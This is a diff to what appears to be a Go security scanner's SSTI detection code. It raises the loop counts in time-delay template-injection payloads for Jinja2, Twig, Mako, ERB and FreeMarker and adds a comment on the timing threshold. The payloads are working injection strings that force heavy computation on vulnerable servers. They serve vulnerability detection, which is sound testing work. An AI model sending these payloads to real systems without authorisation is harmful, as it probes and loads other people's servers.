@@ -25,10 +25,15 @@ var oastPayloads = []sstiOASTPayload{
 }
 
 // timePayloads are time-delay based SSTI payloads.
+//
+// Iteration counts are sized to reliably produce > slowMinDuration (6s) on
+// modern server hardware. They only run if the template engine actually
+// evaluates them (i.e. the endpoint is vulnerable), so non-vulnerable
+// targets see no extra load — the payload appears as raw text.
 var timePayloads = []sstiTimePayload{
-	{engine: "jinja2", slowExpr: "{%for x in range(10000000)%}{%endfor%}", fastExpr: "{%for x in range(1)%}{%endfor%}"},
-	{engine: "twig", slowExpr: "{%for x in 1..10000000%}{%endfor%}", fastExpr: "{%for x in 1..1%}{%endfor%}"},
-	{engine: "mako", slowExpr: "${sum(range(10000000))}", fastExpr: "${sum(range(1))}"},
-	{engine: "erb", slowExpr: "<%10000000.times{}%>", fastExpr: "<%1.times{}%>"},
-	{engine: "freemarker", slowExpr: "<#list 1..10000000 as x></#list>", fastExpr: "<#list 1..1 as x></#list>"},
+	{engine: "jinja2", slowExpr: "{%for x in range(50000000)%}{%endfor%}", fastExpr: "{%for x in range(1)%}{%endfor%}"},
+	{engine: "twig", slowExpr: "{%for x in 1..50000000%}{%endfor%}", fastExpr: "{%for x in 1..1%}{%endfor%}"},
+	{engine: "mako", slowExpr: "${sum(range(50000000))}", fastExpr: "${sum(range(1))}"},
+	{engine: "erb", slowExpr: "<%50000000.times{}%>", fastExpr: "<%1.times{}%>"},
+	{engine: "freemarker", slowExpr: "<#list 1..50000000 as x></#list>", fastExpr: "<#list 1..1 as x></#list>"},
 }
